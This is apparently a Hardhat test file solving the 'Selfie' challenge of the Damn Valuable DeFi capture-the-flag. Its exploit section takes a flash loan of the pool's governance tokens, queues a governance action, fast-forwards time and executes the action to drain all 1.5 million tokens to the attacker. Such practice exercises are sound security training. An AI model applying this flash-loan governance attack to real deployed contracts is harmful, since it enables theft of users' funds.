const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        // connect as the attacker.
        this.token = this.token.connect(attacker);
        this.governance = this.governance.connect(attacker);
        this.pool = this.pool.connect(attacker);

        const ExploitFactory = await ethers.getContractFactory("SelfieExploit", attacker);
        this.exploit = await ExploitFactory.deploy(this.pool.address);

        // check the initial balance of the attacker.
        console.log("Attacker initial balance " + await this.token.balanceOf(attacker.address));

        // trigger the loan
        await this.exploit.triggerLoan(TOKENS_IN_POOL);

        console.log("FIRST ACTION " + await this.governance.actions(0));

        // Check whether the action has been populated.
        console.log("SECOND ACTION " + await this.governance.actions(1));

        // 2 days have to pass between proposal of the action and its execution.
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
        
        // execute the action
        await this.exploit.callAction();

        console.log("Pool balance " + await this.token.balanceOf(this.pool.address));
        console.log("Attacker's updated balance " + await this.token.balanceOf(attacker.address));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
